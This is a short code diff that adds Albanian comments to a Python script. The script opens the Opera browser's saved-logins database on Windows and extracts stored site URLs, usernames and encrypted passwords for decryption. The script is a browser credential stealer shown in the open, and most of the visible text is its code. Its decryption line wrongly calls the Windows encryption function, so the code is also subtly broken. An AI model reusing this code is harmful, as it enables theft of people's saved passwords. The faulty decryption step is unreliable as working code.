@@ -3,13 +3,14 @@ import os
 import sqlite3
 import win32crypt
 
+#pathi per te dhenat e userit
 from pip._vendor.distlib.compat import raw_input
 
 data_path = os.path.expanduser('~') + "\AppData\Roaming\Opera Software\Opera Stable"
 
 login_db = os.path.join(data_path, 'Login Data')
 
-
+#lidhja me databaze dhe query
 c = sqlite3.connect(login_db)
 cursor = c.cursor()
 select_statement = "SELECT origin_url, username_value, password_value FROM logins"
@@ -19,6 +20,7 @@ login_data = cursor.fetchall()
 
 credentials = {}
 
+#dekriptimi i passwordit
 for url, user_name, pwd, in login_data:
 	pwd = win32crypt.CryptProtectData(pwd) #This returns a tuple description and the password
 	credentials[url] = (user_name, pwd[0])
